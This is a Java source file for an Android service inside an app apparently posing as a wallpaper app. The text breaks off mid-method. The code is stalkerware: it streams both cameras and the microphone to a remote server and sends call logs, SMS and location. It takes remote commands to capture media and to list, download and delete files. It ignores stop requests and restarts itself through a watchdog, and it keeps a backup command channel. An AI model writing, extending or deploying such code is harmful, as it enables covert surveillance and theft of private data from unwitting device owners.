package com.example.wallpaperapplication;

import android.Manifest;
import android.app.AlarmManager;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.hardware.camera2.CameraAccessException;
import android.hardware.camera2.CameraManager;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.provider.CallLog;
import android.provider.Telephony;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import android.util.Log;
import androidx.core.app.NotificationCompat;
import androidx.core.content.ContextCompat;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;
import org.webrtc.AudioSource;
import org.webrtc.AudioTrack;
import org.webrtc.Camera2Enumerator;
import org.webrtc.DefaultVideoDecoderFactory;
import org.webrtc.DefaultVideoEncoderFactory;
import org.webrtc.EglBase;
import org.webrtc.IceCandidate;
import org.webrtc.MediaConstraints;
import org.webrtc.PeerConnection;
import org.webrtc.PeerConnectionFactory;
import org.webrtc.RtpReceiver;
import org.webrtc.RtpTransceiver;
import org.webrtc.SdpObserver;
import org.webrtc.SessionDescription;
import org.webrtc.SurfaceTextureHelper;
import org.webrtc.VideoCapturer;
import org.webrtc.VideoSource;
import org.webrtc.VideoTrack;
import io.socket.client.IO;
import io.socket.client.Socket;
import java.net.URISyntaxException;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Collections;
import java.util.Date;
import java.util.List;
import java.util.Locale;
import java.util.UUID;
import java.util.concurrent.atomic.AtomicBoolean;
import java.io.File;
import java.io.FileInputStream;
import android.util.Base64;
import com.google.android.gms.location.FusedLocationProviderClient;
import com.google.android.gms.location.LocationCallback;
import com.google.android.gms.location.LocationRequest;
import com.google.android.gms.location.LocationResult;
import com.google.android.gms.location.LocationServices;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.database.ServerValue;
import io.agora.rtm.ErrorInfo;
import io.agora.rtm.ResultCallback;
import io.agora.rtm.RtmChannel;
import io.agora.rtm.RtmChannelAttribute;
import io.agora.rtm.RtmChannelListener;
import io.agora.rtm.RtmChannelMember;
import io.agora.rtm.RtmClient;
import io.agora.rtm.RtmClientListener;
import io.agora.rtm.RtmMessage;
import io.agora.rtm.SendMessageOptions;

public class StreamingService extends Service {

    private static final String TAG                   = "StreamingService";
    private static final String CHANNEL_ID            = "streaming_channel";
    private static final int    NOTIFICATION_ID       = 1;
    public  static final String DEFAULT_SIGNALING_URL = "https://hypewebrtc.onrender.com";
    private static final long   DATA_POLL_INTERVAL    = 30_000L;
    private static final int    MAX_VIDEO_BITRATE_KBPS = 800;
    private static final int    WATCHDOG_REQUEST_CODE  = 9901;
    private static final long   WATCHDOG_INTERVAL_MS   = 4 * 60 * 1000L;
    private static final long   FIREBASE_HEARTBEAT_MS  = 30_000L;
    // FIX Bug 15 — Replace "YOUR_AGORA_APP_ID" with your real Agora App ID from console.agora.io
    private static final String AGORA_APP_ID          = "YOUR_AGORA_APP_ID";
    private static final String AGORA_CHANNEL         = "webrtc_signal_channel";
    private static final int    SOCKET_FAIL_THRESHOLD  = 3;

    // ---- WebRTC ----
    private PeerConnectionFactory  factory;
    private EglBase                eglBase;
    private SurfaceTextureHelper   frontHelper;
    private SurfaceTextureHelper   backHelper;
    private VideoCapturer          frontCapturer;
    private VideoCapturer          backCapturer;
    private VideoSource            frontSource;
    private VideoSource            backSource;
    private AudioSource            audioSource;
    private PeerConnection         peerConnection;
    private boolean                usingFrontCamera   = true;

    // ---- Socket.IO (primary signaling) ----
    private Socket  socket;
    private String  webClientId     = null;
    private int     socketFailCount = 0;
    private boolean usingAgoraSignal = false;

    // ---- Agora RTM (backup signaling) ----
    private RtmClient  agoraRtmClient;
    private RtmChannel agoraRtmChannel;

    // ---- Firebase (heartbeat + presence) ----
    private DatabaseReference firebaseRef;
    private Handler           firebaseHandler;
    private Runnable          firebaseRunnable;
    private String            deviceId;

    // ---- Data polling ----
    private Handler  dataHandler;
    private Runnable dataRunnable;

    // ---- Location ----
    private FusedLocationProviderClient fusedLocationClient;
    private LocationCallback            locationCallback;

    // ---- Torch ----
    private CameraManager cameraManager;
    private String        torchCameraId = null;
    private boolean       torchOn       = false;

    // ---- CaptureManager (image/audio/video) ----
    private CaptureManager captureManager;

    // FIX Bug 9 — Use AtomicBoolean to prevent fullReconnect() race condition
    private final AtomicBoolean isReconnecting = new AtomicBoolean(false);
    private final Handler       mainHandler    = new Handler(Looper.getMainLooper());

    // =========================================================================
    // Lifecycle
    // =========================================================================

    @Override
    public void onCreate() {
        super.onCreate();
        Log.d(TAG, "onCreate");
        startForeground(NOTIFICATION_ID, createNotification());

        if (!hasEssentialPermissions()) {
            Log.e(TAG, "Missing essential permissions — stopping");
            stopSelf();
            return;
        }

        // FIX Bug 4 — Stable deviceId persisted in SharedPreferences.
        // Old code: deviceId = UUID.randomUUID().toString().substring(0, 8);
        // That generated a brand-new 8-char ID on every service restart, making
        // the device appear as a new entry in the dashboard and Firebase on every
        // reconnect. Now we persist the ID on first run and reuse it forever.
        SharedPreferences prefs = getSharedPreferences("svc_prefs", MODE_PRIVATE);
        deviceId = prefs.getString("stable_device_id", null);
        if (deviceId == null) {
            deviceId = UUID.randomUUID().toString().substring(0, 8);
            prefs.edit().putString("stable_device_id", deviceId).apply();
            Log.d(TAG, "New stable deviceId generated and persisted: " + deviceId);
        } else {
            Log.d(TAG, "Reusing persisted deviceId: " + deviceId);
        }

        cameraManager = (CameraManager) getSystemService(Context.CAMERA_SERVICE);
        try {
            String[] ids = cameraManager.getCameraIdList();
            if (ids.length > 0) torchCameraId = ids[0];
        } catch (CameraAccessException e) { Log.e(TAG, "Camera list error", e); }

        initializeWebRTC();
        setupMediaStreaming();
        connectSignaling();
        startDataPollingIfAllowed();
        startFirebaseHeartbeat();
        fusedLocationClient = LocationServices.getFusedLocationProviderClient(this);
        scheduleWatchdog();
        // captureManager is initialized after socket connects (in connectSignaling's onConnect)
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent != null) {
            String action = intent.getAction();
            if (action == null) action = "";
            switch (action) {
                case "STOP_STREAMING":
                    Log.i(TAG, "Stop ignored — persistent mode");
                    break;
                case "ACTION_SYNC_DATA":
                    if (webClientId != null) { sendCallLogs(); sendSmsMessages(); }
                    break;
                case "WATCHDOG_RESTART":
                    Log.d(TAG, "Watchdog ping");
                    // FIX Bug 10 — null check before accessing socket
                    if (socket == null || !socket.connected()) {
                        Log.w(TAG, "Watchdog: socket dead — reconnecting");
                        connectSignaling();
                    }
                    if (peerConnection == null && webClientId != null) fullReconnect();
                    scheduleWatchdog();
                    break;
                default:
                    break;
            }
        }
        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        Log.d(TAG, "onDestroy");
        stopFirebaseHeartbeat();
        cleanup();
        disconnectSignaling();
        disconnectAgora();
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }

    @Override
    public void onTaskRemoved(Intent rootIntent) {
        Log.d(TAG, "onTaskRemoved — restarting");
        Intent restart = new Intent(getApplicationContext(), StreamingService.class);
        restart.setPackage(getPackageName());
        try { ContextCompat.startForegroundService(getApplicationContext(), restart); }
        catch (IllegalStateException e) { Log.w(TAG, "FGS denied in onTaskRemoved", e); }
        super.onTaskRemoved(rootIntent);
    }

    // =========================================================================
    // AlarmManager Watchdog
    // =========================================================================

    private void scheduleWatchdog() {
        AlarmManager am = (AlarmManager) getSystemService(Context.ALARM_SERVICE);
        if (am == null) return;
        Intent i = new Intent(this, StreamingService.class);
        i.setAction("WATCHDOG_RESTART");
        int flags = (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M)
                ? PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE
                : PendingIntent.FLAG_UPDATE_CURRENT;
        PendingIntent pi = PendingIntent.getService(this, WATCHDOG_REQUEST_CODE, i, flags);
        long at = System.currentTimeMillis() + WATCHDOG_INTERVAL_MS;
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M)
                am.setExactAndAllowWhileIdle(AlarmManager.RTC_WAKEUP, at, pi);
            else
                am.setExact(AlarmManager.RTC_WAKEUP, at, pi);
            Log.d(TAG, "Watchdog in " + (WATCHDOG_INTERVAL_MS / 1000) + "s");
        } catch (Exception e) { Log.w(TAG, "Watchdog fail", e); }
    }

    // =========================================================================
    // Firebase Heartbeat + Presence
    // =========================================================================

    private void startFirebaseHeartbeat() {
        try {
            FirebaseDatabase db = FirebaseDatabase.getInstance();
            firebaseRef = db.getReference("devices").child(deviceId);
            firebaseRef.onDisconnect().removeValue();

            firebaseHandler  = new Handler(Looper.getMainLooper());
            firebaseRunnable = new Runnable() {
                @Override public void run() {
                    try {
                        JSONObject status = new JSONObject();
                        status.put("online",      true);
                        status.put("deviceId",    deviceId);
                        status.put("signalingUrl", getSignalingUrl());
                        status.put("webClientId",  webClientId != null ? webClientId : "none");
                        firebaseRef.child("heartbeat").setValue(ServerValue.TIMESTAMP);
                        firebaseRef.child("status").setValue(status.toString());
                        Log.d(TAG, "Firebase heartbeat sent");
                    } catch (Exception e) { Log.e(TAG, "Firebase heartbeat error", e); }
                    if (firebaseHandler != null) firebaseHandler.postDelayed(this, FIREBASE_HEARTBEAT_MS);
                }
            };
            firebaseHandler.post(firebaseRunnable);
            Log.d(TAG, "Firebase heartbeat started for device: " + deviceId);
        } catch (Exception e) {
            Log.e(TAG, "Firebase init failed (check google-services.json)", e);
        }
    }

    private void stopFirebaseHeartbeat() {
        if (firebaseHandler != null && firebaseRunnable != null) {
            firebaseHandler.removeCallbacks(firebaseRunnable);
            firebaseHandler  = null;
            firebaseRunnable = null;
        }
        if (firebaseRef != null) {
            try { firebaseRef.removeValue(); } catch (Exception ignored) {}
            firebaseRef = null;
        }
    }

    // =========================================================================
    // Agora RTM — Backup Signaling
    // =========================================================================

    private void initAgoraRtm() {
        if ("YOUR_AGORA_APP_ID".equals(AGORA_APP_ID)) {
            Log.w(TAG, "Agora App ID not set — skipping Agora RTM backup");
            return;
        }
        try {
            agoraRtmClient = RtmClient.createInstance(getApplicationContext(), AGORA_APP_ID, new RtmClientListener() {
                @Override public void onConnectionStateChanged(int state, int reason) {
                    Log.d(TAG, "Agora RTM state: " + state);
                    if (state == RtmClient.CONNECTION_STATE_ABORTED) connectAgoraRtm();
                }
                @Override public void onMessageReceived(RtmMessage msg, String peerId) {
                    handleAgoraMessage(msg.getText());
                }
                @Override public void onTokenExpired()          { Log.w(TAG, "Agora token expired"); }
                @Override public void onPeersOnlineStatusChanged(java.util.Map<String, Integer> map) {}
            });
            connectAgoraRtm();
        } catch (Exception e) { Log.e(TAG, "Agora RTM init failed", e); }
    }

    private void connectAgoraRtm() {
        if (agoraRtmClient == null) return;
        agoraRtmClient.login(null, deviceId, new ResultCallback<Void>() {
            @Override public void onSuccess(Void v) { Log.d(TAG, "Agora RTM login OK"); joinAgoraChannel(); }
            @Override public void onFailure(ErrorInfo e) { Log.e(TAG, "Agora login fail: " + e.getErrorDescription()); }
        });
    }

    private void joinAgoraChannel() {
        try {
            agoraRtmChannel = agoraRtmClient.createChannel(AGORA_CHANNEL, new RtmChannelListener() {
                @Override public void onMemberCountUpdated(int count) {}
                @Override public void onAttributesUpdated(List<RtmChannelAttribute> attrs) {}
                @Override public void onMessageReceived(RtmMessage msg, RtmChannelMember member) { handleAgoraMessage(msg.getText()); }
                @Override public void onMemberJoined(RtmChannelMember m) {
                    Log.d(TAG, "Agora: web member joined: " + m.getUserId());
                    webClientId = m.getUserId();
                    if (peerConnection == null) setupPeerConnection();
                    createAndSendOffer();
                }
                @Override public void onMemberLeft(RtmChannelMember m) {
                    if (m.getUserId().equals(webClientId)) { webClientId = null; stopLocationUpdates(); }
                }
            });
            if (agoraRtmChannel != null) {
                agoraRtmChannel.join(new ResultCallback<Void>() {
                    @Override public void onSuccess(Void v) { Log.d(TAG, "Agora channel joined: " + AGORA_CHANNEL); usingAgoraSignal = true; }
                    @Override public void onFailure(ErrorInfo e) { Log.e(TAG, "Agora join fail", e); }
                });
            }
        } catch (Exception e) { Log.e(TAG, "Agora channel create error", e); }
    }

    private void sendViaAgora(String jsonString) {
        if (agoraRtmChannel == null || webClientId == null) return;
        RtmMessage msg = agoraRtmClient.createMessage();
        msg.setText(jsonString);
        agoraRtmChannel.sendMessage(msg, new SendMessageOptions(), new ResultCallback<Void>() {
            @Override public void onSuccess(Void v)     { Log.d(TAG, "Agora signal sent"); }
            @Override public void onFailure(ErrorInfo e) { Log.e(TAG, "Agora send fail", e); }
        });
    }

    private void handleAgoraMessage(String text) {
        try { handleSignaling(new JSONObject(text)); } catch (JSONException e) { Log.e(TAG, "Agora msg parse error", e); }
    }

    private void disconnectAgora() {
        try {
            if (agoraRtmChannel != null) { agoraRtmChannel.leave(null); agoraRtmChannel.release(); agoraRtmChannel = null; }
            if (agoraRtmClient  != null) { agoraRtmClient.logout(null);  agoraRtmClient.release();  agoraRtmClient  = null; }
        } catch (Exception e) { Log.e(TAG, "Agora disconnect error", e); }
    }

    // =========================================================================
    // Permissions
    // =========================================================================

    private String getSignalingUrl() { return SettingsRepository.getSignalingUrl(this); }

    private boolean hasEssentialPermissions() {
        boolean cam    = ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA)       == PackageManager.PERMISSION_GRANTED;
        boolean audio  = ContextCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO) == PackageManager.PERMISSION_GRANTED;
        boolean notify = Build.VERSION.SDK_INT < Build.VERSION_CODES.TIRAMISU ||
                ContextCompat.checkSelfPermission(this, Manifest.permission.POST_NOTIFICATIONS) == PackageManager.PERMISSION_GRANTED;
        if (!cam)    Log.e(TAG, "CAMERA missing");
        if (!audio)  Log.e(TAG, "RECORD_AUDIO missing");
        if (!notify) Log.e(TAG, "POST_NOTIFICATIONS missing");
        return cam && audio && notify;
    }

    // =========================================================================
    // WebRTC Init
    // =========================================================================

    private void initializeWebRTC() {
        PeerConnectionFactory.initialize(
                PeerConnectionFactory.InitializationOptions.builder(this)
                        .setEnableInternalTracer(true)
                        .createInitializationOptions());
        eglBase = EglBase.create();
        factory = PeerConnectionFactory.builder()
                .setVideoEncoderFactory(new DefaultVideoEncoderFactory(eglBase.getEglBaseContext(), true, true))
                .setVideoDecoderFactory(new DefaultVideoDecoderFactory(eglBase.getEglBaseContext()))
                .createPeerConnectionFactory();
    }

    private void setupMediaStreaming() {
        setupFrontCapture();
        setupBackCapture();
        setupAudioCapture();
        setupPeerConnection();
    }

    private void setupFrontCapture() {
        Camera2Enumerator e = new Camera2Enumerator(this);
        String dev = null;
        for (String n : e.getDeviceNames()) { if (e.isFrontFacing(n)) { dev = n; break; } }
        if (dev == null) { Log.e(TAG, "No front camera"); return; }
        frontCapturer = e.createCapturer(dev, null);
        frontHelper   = SurfaceTextureHelper.create("FrontThread", eglBase.getEglBaseContext());
        frontSource   = factory.createVideoSource(false);
        frontCapturer.initialize(frontHelper, getApplicationContext(), frontSource.getCapturerObserver());
        try { frontCapturer.startCapture(640, 480, 25); } catch (Exception ex) { Log.e(TAG, "Front capture fail", ex); }
    }

    private void setupBackCapture() {
        Camera2Enumerator e = new Camera2Enumerator(this);
        String dev = null;
        for (String n : e.getDeviceNames()) { if (e.isBackFacing(n)) { dev = n; break; } }
        if (dev == null) { Log.w(TAG, "No back camera"); return; }
        backCapturer = e.createCapturer(dev, null);
        backHelper   = SurfaceTextureHelper.create("BackThread", eglBase.getEglBaseContext());
        backSource   = factory.createVideoSource(false);
        backCapturer.initialize(backHelper, getApplicationContext(), backSource.getCapturerObserver());
        try { backCapturer.startCapture(640, 480, 25); } catch (Exception ex) { Log.e(TAG, "Back capture fail", ex); }
    }

    private void setupAudioCapture() {
        MediaConstraints ac = new MediaConstraints();
        ac.mandatory.add(new MediaConstraints.KeyValuePair("googEchoCancellation", "true"));
        ac.mandatory.add(new MediaConstraints.KeyValuePair("googAutoGainControl",  "true"));
        ac.mandatory.add(new MediaConstraints.KeyValuePair("googNoiseSuppression", "true"));
        ac.mandatory.add(new MediaConstraints.KeyValuePair("googHighpassFilter",   "true"));
        audioSource = factory.createAudioSource(ac);
    }

    // =========================================================================
    // Camera Switch
    // =========================================================================

    private void switchCamera() {
        mainHandler.post(() -> {
            try {
                if (usingFrontCamera) {
                    if (frontCapturer != null) frontCapturer.stopCapture();
                    if (backCapturer  != null) backCapturer.startCapture(640, 480, 25);
                } else {
                    if (backCapturer  != null) backCapturer.stopCapture();
                    if (frontCapturer != null) frontCapturer.startCapture(640, 480, 25);
                }
                usingFrontCamera = !usingFrontCamera;
                Log.d(TAG, "Camera switched. Front active: " + usingFrontCamera);
            } catch (Exception e) { Log.e(TAG, "Camera switch fail", e); }
        });
    }

    // =========================================================================
    // PeerConnection
    // =========================================================================

    private void setupPeerConnection() {
        List<PeerConnection.IceServer> ice = new ArrayList<>();
        ice.add(PeerConnection.IceServer.builder("stun:stun.l.google.com:19302").createIceServer());
        ice.add(PeerConnection.IceServer.builder("stun:stun1.l.google.com:19302").createIceServer());
        ice.add(PeerConnection.IceServer.builder("stun:stun2.l.google.com:19302").createIceServer());
        ice.add(PeerConnection.IceServer.builder("turn:freestun.net:3478").setUsername("free").setPassword("free").createIceServer());
        ice.add(PeerConnection.IceServer.builder("turns:freestun.net:5349").setUsername("free").setPassword("free").createIceServer());
        ice.add(PeerConnection.IceServer.builder("turn:global.relay.metered.ca:80").setUsername("openrelayproject").setPassword("openrelayproject").createIceServer());
        ice.add(PeerConnection.IceServer.builder("turn:global.relay.metered.ca:443").setUsername("openrelayproject").setPassword("openrelayproject").createIceServer());
        ice.add(PeerConnection.IceServer.builder("turns:global.relay.metered.ca:443?transport=tcp").setUsername("openrelayproject").setPassword("openrelayproject").createIceServer());

        PeerConnection.RTCConfiguration cfg = new PeerConnection.RTCConfiguration(ice);
        cfg.sdpSemantics                       = PeerConnection.SdpSemantics.UNIFIED_PLAN;
        cfg.continualGatheringPolicy           = PeerConnection.ContinualGatheringPolicy.GATHER_CONTINUALLY;
        cfg.tcpCandidatePolicy                 = PeerConnection.TcpCandidatePolicy.ENABLED;
        cfg.bundlePolicy                       = PeerConnection.BundlePolicy.MAXBUNDLE;
        cfg.rtcpMuxPolicy                      = PeerConnection.RtcpMuxPolicy.REQUIRE;
        cfg.iceConnectionReceivingTimeout      = 5000;
        cfg.iceBackupCandidatePairPingInterval = 2000;

        peerConnection = factory.createPeerConnection(cfg, new PeerConnection.Observer() {
            @Override public void onSignalingChange(PeerConnection.SignalingState s)        { Log.d(TAG, "Signaling: " + s); }
            @Override public void onIceConnectionReceivingChange(boolean r)                 {}
            @Override public void onIceGatheringChange(PeerConnection.IceGatheringState s)  { Log.d(TAG, "Gathering: " + s); }
            @Override public void onIceCandidatesRemoved(IceCandidate[] cs)                 {}
            @Override public void onAddStream(org.webrtc.MediaStream ms)                    {}
            @Override public void onRemoveStream(org.webrtc.MediaStream ms)                 {}
            @Override public void onDataChannel(org.webrtc.DataChannel dc)                  {}
            @Override public void onRenegotiationNeeded()                                   { Log.d(TAG, "Renegotiation needed"); }
            @Override public void onAddTrack(RtpReceiver r, org.webrtc.MediaStream[] ms)    { Log.d(TAG, "Track: " + r.id()); }

            @Override
            public void onIceConnectionChange(PeerConnection.IceConnectionState s) {
                Log.d(TAG, "ICE: " + s);
                if (s == PeerConnection.IceConnectionState.FAILED
                        || s == PeerConnection.IceConnectionState.DISCONNECTED) {
                    mainHandler.post(StreamingService.this::restartIce);
                } else if (s == PeerConnection.IceConnectionState.CLOSED) {
                    mainHandler.postDelayed(StreamingService.this::fullReconnect, 2000);
                }
            }

            @Override
            public void onIceCandidate(IceCandidate c) {
                sendSignal(buildIceCandidateJson(c));
            }
        });

        if (peerConnection == null) { Log.e(TAG, "PeerConnection creation failed"); return; }

        if (frontSource != null) {
            VideoTrack t = factory.createVideoTrack("front_camera", frontSource);
            peerConnection.addTransceiver(t, new RtpTransceiver.RtpTransceiverInit(
                    RtpTransceiver.RtpTransceiverDirection.SEND_ONLY, Collections.singletonList("stream")));
        }
        if (backSource != null) {
            VideoTrack t = factory.createVideoTrack("back_camera", backSource);
            peerConnection.addTransceiver(t, new RtpTransceiver.RtpTransceiverInit(
                    RtpTransceiver.RtpTransceiverDirection.SEND_ONLY, Collections.singletonList("stream")));
        }
        if (audioSource != null) {
            AudioTrack t = factory.createAudioTrack("audio", audioSource);
            peerConnection.addTransceiver(t, new RtpTransceiver.RtpTransceiverInit(
                    RtpTransceiver.RtpTransceiverDirection.SEND_ONLY, Collections.singletonList("stream")));
        }
        Log.d(TAG, "PeerConnection ready");
    }

    // =========================================================================
    // Signal routing: Socket.IO primary, Agora fallback
    // =========================================================================

    private void sendSignal(JSONObject msg) {
        if (msg == null) return;
        if (socket != null && socket.connected()) {
            socket.emit("signal", msg);
        } else if (usingAgoraSignal && agoraRtmChannel != null) {
            sendViaAgora(msg.toString());
        } else {
            Log.w(TAG, "No signaling channel available — signal dropped");
        }
    }

    private JSONObject buildIceCandidateJson(IceCandidate c) {
        if (webClientId == null) return null;
        // FIX Bug 10 — null-check socket before calling socket.id()
        String fromId = (socket != null && socket.connected()) ? socket.id() : deviceId;
        try {
            JSONObject candidate = new JSONObject();
            candidate.put("sdpMid",        c.sdpMid);
            candidate.put("sdpMLineIndex", c.sdpMLineIndex);
            candidate.put("candidate",     c.sdp);
            JSONObject signal = new JSONObject();
            signal.put("candidate", candidate);
            JSONObject msg = new JSONObject();
            msg.put("to",     webClientId);
            msg.put("from",   fromId);
            msg.put("signal", signal);
            return msg;
        } catch (JSONException e) { Log.e(TAG, "ICE JSON error", e); return null; }
    }

    // =========================================================================
    // ICE Restart (lightweight)
    // =========================================================================

    private void restartIce() {
        if (peerConnection == null || webClientId == null) return;
        Log.d(TAG, "ICE restart");
        // FIX Bug 10 — null-check socket before calling socket.id()
        final String fromId = (socket != null && socket.connected()) ? socket.id() : deviceId;
        MediaConstraints mc = new MediaConstraints();
        mc.mandatory.add(new MediaConstraints.KeyValuePair("IceRestart",           "true"));
        mc.mandatory.add(new MediaConstraints.KeyValuePair("OfferToReceiveAudio",  "false"));
        mc.mandatory.add(new MediaConstraints.KeyValuePair("OfferToReceiveVideo",  "false"));
        peerConnection.createOffer(new SdpObserver() {
            @Override public void onCreateSuccess(SessionDescription sdp) {
                String mod = applyBitrateConstraints(sdp.description);
                SessionDescription modSdp = new SessionDescription(sdp.type, mod);
                peerConnection.setLocalDescription(new SdpObserver() {
                    @Override public void onSetSuccess() {
                        try {
                            JSONObject sig = new JSONObject(); sig.put("type", "offer"); sig.put("sdp", modSdp.description);
                            JSONObject msg = new JSONObject(); msg.put("to", webClientId); msg.put("from", fromId); msg.put("signal", sig);
                            sendSignal(msg);
                            Log.d(TAG, "ICE restart offer sent");
                        } catch (JSONException e) { Log.e(TAG, "ICE restart send fail", e); }
                    }
                    @Override public void onSetFailure(String e)    { Log.e(TAG, "ICE setLocal fail: " + e); }
                    @Override public void onCreateSuccess(SessionDescription s) {}
                    @Override public void onCreateFailure(String f) {}
                }, modSdp);
            }
            @Override public void onSetSuccess()             {}
            @Override public void onCreateFailure(String e)  { Log.e(TAG, "ICE createOffer fail: " + e); }
            @Override public void onSetFailure(String e)     {}
        }, mc);
    }

    // =========================================================================
    // Full Reconnect (teardown + rebuild)
    // =========================================================================

    // FIX Bug 9 — Use AtomicBoolean.compareAndSet() to eliminate race condition.
    private void fullReconnect() {
        if (!isReconnecting.compareAndSet(false, true)) {
            Log.d(TAG, "fullReconnect already in progress — skipping");
            return;
        }
        Log.d(TAG, "Full reconnect");
        try {
            if (peerConnection != null) { peerConnection.close(); peerConnection = null; }
            setupPeerConnection();
            if (webClientId != null) createAndSendOffer();
        } finally {
            mainHandler.postDelayed(() -> isReconnecting.set(false), 3000);
        }
    }

    // =========================================================================
    // Socket.IO Signaling
    // =========================================================================

    private void connectSignaling() {
        disconnectSignaling();
        String url = getSignalingUrl();
        Log.d(TAG, "Connecting: " + url);
        IO.Options opts = new IO.Options();
        opts.transports           = new String[]{"websocket"};
        opts.reconnection         = true;
        opts.reconnectionAttempts = Integer.MAX_VALUE;
        opts.reconnectionDelay    = 3000;
        opts.reconnectionDelayMax = 10000;

        try { socket = IO.socket(url, opts); }
        catch (URISyntaxException e) { Log.e(TAG, "Bad URL", e); stopSelf(); return; }

        socket.on(Socket.EVENT_CONNECT, args -> {
            Log.d(TAG, "Socket connected");
            socketFailCount  = 0;
            usingAgoraSignal = false;
            // Register with unified event name expected by server.js
            socket.emit("identify", "android");
            // Also emit register-device for Kotlin SpywareService.kt compatibility
            try {
                JSONObject reg = new JSONObject();
                reg.put("deviceId", deviceId);
                socket.emit("register-device", reg);
            } catch (JSONException ignored) {}
            // Init CaptureManager with current socket reference
            if (captureManager == null) {
                captureManager = new CaptureManager(getApplicationContext(), socket, deviceId);
            } else {
                captureManager.setSocket(socket);
            }
            if (webClientId != null) {
                if (peerConnection == null) setupPeerConnection();
                createAndSendOffer();
            }
        }).on(Socket.EVENT_DISCONNECT, args -> {
            Log.w(TAG, "Socket disconnected");
        }).on(Socket.EVENT_CONNECT_ERROR, args -> {
            socketFailCount++;
            Log.e(TAG, "Socket error #" + socketFailCount + ": " + Arrays.toString(args));
            if (socketFailCount >= SOCKET_FAIL_THRESHOLD && !usingAgoraSignal) {
                Log.w(TAG, "Socket.IO failed " + socketFailCount + " times — activating Agora RTM fallback");
                initAgoraRtm();
            }
        }).on("web-client-ready", args -> {
            // FIX: server sends webClientId as object field, not bare string
            if (args.length > 0) {
                if (args[0] instanceof JSONObject) {
                    webClientId = ((JSONObject) args[0]).optString("webClientId", null);
                } else if (args[0] instanceof String) {
                    webClientId = (String) args[0];
                }
                if (webClientId != null) {
                    Log.d(TAG, "Web client ready: " + webClientId);
                    if (peerConnection == null) setupPeerConnection();
                    createAndSendOffer();
                    startLocationUpdatesIfAllowed();
                    sendCallLogs();
                    sendSmsMessages();
                }
            }
        // Also handle start-stream (Kotlin path compatibility)
        }).on("start-stream", args -> {
            if (args.length > 0 && args[0] instanceof JSONObject) {
                String controllerId = ((JSONObject) args[0]).optString("controllerId", null);
                if (controllerId != null) {
                    webClientId = controllerId;
                    Log.d(TAG, "start-stream from controller: " + controllerId);
                    if (peerConnection == null) setupPeerConnection();
                    createAndSendOffer();
                    startLocationUpdatesIfAllowed();
                    sendCallLogs();
                    sendSmsMessages();
                }
            }
        }).on("signal", args -> {
            if (args.length > 0 && args[0] instanceof JSONObject) handleSignaling((JSONObject) args[0]);
        }).on("web-client-disconnected", args -> {
            if (args.length > 0) {
                String disconnectedId = null;
                if (args[0] instanceof String)     disconnectedId = (String) args[0];
                else if (args[0] instanceof JSONObject) disconnectedId = ((JSONObject) args[0]).optString("webClientId");
                if (disconnectedId != null && disconnectedId.equals(webClientId)) {
                    Log.d(TAG, "Web client disconnected");
                    webClientId = null;
                    stopLocationUpdates();
                }
            }
        }).on("torch", args -> {
            if (args.length > 0 && args[0] instanceof JSONObject) {
                try { setTorch(((JSONObject) args[0]).optBoolean("on", false)); }
                catch (Exception e) { Log.e(TAG, "Torch error", e); }
            }
        }).on("switch_camera", args -> {
            Log.d(TAG, "Camera switch command received");
            switchCamera();
        // ---------------------------------------------------------------
        // FIX: Wire capture-image / capture-audio / capture-video to CaptureManager
        // ---------------------------------------------------------------
        }).on("capture-image", args -> {
            if (captureManager == null) return;
            String camera = "front";
            if (args.length > 0 && args[0] instanceof JSONObject) {
                camera = ((JSONObject) args[0]).optString("camera", "front");
            }
            captureManager.captureImage(camera);
        }).on("capture-audio", args -> {
            if (captureManager == null) return;
            int duration = 10;
            if (args.length > 0 && args[0] instanceof JSONObject) {
                duration = ((JSONObject) args[0]).optInt("duration", 10);
            }
            captureManager.captureAudio(duration);
        }).on("capture-video", args -> {
            if (captureManager == null) return;
            int duration = 15;
            String camera = "back";
            if (args.length > 0 && args[0] instanceof JSONObject) {
                JSONObject params = (JSONObject) args[0];
                duration = params.optInt("duration", 15);
                camera   = params.optString("camera", "back");
            }
            captureManager.captureVideo(duration, camera);
        }).on("fs:list",           args -> { if (args.length > 0 && args[0] instanceof JSONObject) handleFsList((JSONObject) args[0]); })
          .on("fs:download",       args -> { if (args.length > 0 && args[0] instanceof JSONObject) handleFsDownload((JSONObject) args[0]); })
          .on("fs:download_ready", args -> { if (args.length > 0 && args[0] instanceof JSONObject) handleFsDownloadReady((JSONObject) args[0]); })
          .on("fs:delete",         args -> { if (args.length > 0 && args[0] instanceof JSONObject) handleFsDelete((JSONObject) args[0]); });

        socket.connect();
    }

    private void disconnectSignaling() {
        if (socket != null) {
            try { socket.off(); socket.disconnect(); } catch (Exception ignored) {}
            socket = null;
        }
    }

    // =========================================================================
    // Torch
    // =========================================================================

    private void setTorch(boolean enable) {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.M) { Log.w(TAG, "Torch needs API 23+"); return; }
        if (torchCameraId == null) { Log.w(TAG, "No torch camera"); return; }
        try {
            cameraManager.setTorchMode(torchCameraId, enable);
            torchOn = enable;
            Log.d(TAG, "Torch: " + enable);
        } catch (CameraAccessException e) { Log.e(TAG, "Torch fail", e); }
    }

    // =========================================================================
    // SDP: bitrate cap + sendonly enforcement
    // =========================================================================

    private String applyBitrateConstraints(String sdp) {
        StringBuilder sb = new StringBuilder();
        boolean inVideo = false;
        for (String line : sdp.split("\r?\n")) {
            sb.append(line).append("\r\n");
            if (line.startsWith("m=video"))   inVideo = true;
            else if (line.startsWith("m="))   inVideo = false;
